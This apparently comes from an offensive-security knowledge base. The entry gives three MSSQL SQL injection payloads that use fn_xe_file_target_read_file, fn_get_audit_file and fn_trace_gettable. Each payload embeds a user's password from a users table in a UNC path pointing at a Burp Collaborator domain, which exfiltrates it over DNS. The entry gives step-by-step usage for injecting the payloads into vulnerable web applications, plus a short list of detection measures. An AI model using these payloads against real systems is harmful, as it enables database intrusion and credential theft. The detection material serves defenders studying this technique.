---
id: 908f5880-850e-443e-a603-a0bf09e26b36
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.004131+00:00'
updated_at: '2023-04-10T20:22:40.587710+00:00'
platforms:
  - Windows
  - Database
tags:
  - mssql
  - dns-exfiltration
  - sql-injection
validated: true
---

# mssql-dns-exfiltration-permission-check-queries

## Code

```sql
# Permissions: Requires VIEW SERVER STATE permission on the server.
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\1.xem',null,null))

# Permissions: Requires the CONTROL SERVER permission.
1 and (select 1 where exists(select * from fn_get_audit_file('\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\',default,default)))
1 and exists(select * from fn_trace_gettable('\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\1.trc',default))
```

## Description

This SQL code snippet contains three queries to check permissions for MSSQL functions that enable out-of-band DNS exfiltration. It embeds sample data (password from users table) into UNC paths that trigger DNS resolutions to an attacker-controlled domain, allowing blind exfiltration during SQL injection attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `users` | Database table with sensitive data | `users` |
| `pass` | Column containing exfiltrable data (e.g., password) | `pass` |
| `id=1` | Condition to select specific row | `id=1` |
| `xxxx.burpcollaborator.net` | Attacker's DNS collaborator domain for capturing queries | `attacker-dns.com` |

## Usage

Inject these queries sequentially into a vulnerable SQL injection point in an MSSQL-backed web application. Start a DNS collaborator listener (e.g., Burp Collaborator) beforehand. Each query tests a different function: extended events, audit files, and traces. Use the results to determine which exfiltration path is viable, then adapt for larger data dumps by chunking and encoding payloads.

## Detection

- Monitor SQL query logs for UNC path constructions or function calls like fn_xe_file_target_read_file, fn_get_audit_file, fn_trace_gettable.
- Analyze outbound DNS traffic from database servers for subdomains with base64-encoded or unusual strings.
- Enable SQL Server auditing for permission checks and injection patterns.
- Use SIEM rules to alert on DNS queries from non-standard sources like MSSQL processes.

## Related

- [[procedures/mssql-out-of-band-dns-exfiltration]]
- [[tools/Burp-Suite]]
